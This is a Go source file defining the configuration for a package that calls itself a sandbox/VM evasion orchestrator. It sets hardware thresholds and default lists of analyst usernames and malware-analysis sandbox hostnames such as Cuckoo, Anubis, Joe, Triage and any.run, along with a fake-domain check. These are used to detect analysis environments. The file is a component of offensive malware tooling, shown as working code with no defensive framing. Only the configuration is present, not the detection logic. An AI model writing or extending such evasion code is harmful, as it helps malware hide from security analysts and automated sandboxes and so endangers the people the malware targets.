// Package sandbox provides a configurable sandbox/VM evasion orchestrator.
package sandbox

import "time"

// Config configures sandbox detection thresholds and indicator lists.
type Config struct {
	MinDiskGB      float64       // minimum expected disk size in GB
	MinRAMGB       float64       // minimum expected RAM in GB
	MinCPUCores    int           // minimum expected CPU cores
	BadUsernames   []string      // analyst usernames to detect
	BadHostnames   []string      // sandbox hostnames to detect
	FakeDomain     string        // domain that should NOT respond (sandbox check)
	EvasionTimeout time.Duration // max time for evasion checks
}

// DefaultConfig returns sensible defaults for sandbox detection.
func DefaultConfig() Config {
	return Config{
		MinDiskGB:   64,
		MinRAMGB:    4,
		MinCPUCores: 2,
		BadUsernames: []string{
			"sandbox", "malware", "virus", "test", "analysis",
			"maltest", "currentuser", "user", "analyst",
		},
		BadHostnames: []string{
			"sandbox", "malware", "virus", "cuckoo", "anubis",
			"joe", "triage", "any.run",
		},
	}
}
